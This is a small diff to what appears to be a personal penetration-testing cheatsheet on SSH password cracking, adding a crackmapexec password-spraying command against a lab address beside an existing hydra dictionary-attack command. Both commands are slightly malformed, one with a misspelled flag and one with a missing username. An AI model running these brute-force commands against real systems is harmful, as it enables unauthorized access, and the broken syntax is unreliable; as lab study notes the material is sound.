@@ -3,6 +3,9 @@
 # HYDRA [[Hydra-Password-Cracking-Cheatsheet.pdf]]
 
 # ssh
+```
+crackmapexec ssh 10.10.11.247 -u users -p 'passwd' -ontinue-on-success
+```
 ## dict
 ```
 hydra $ip -s 22 ssh -l -P big_wordlist.txt
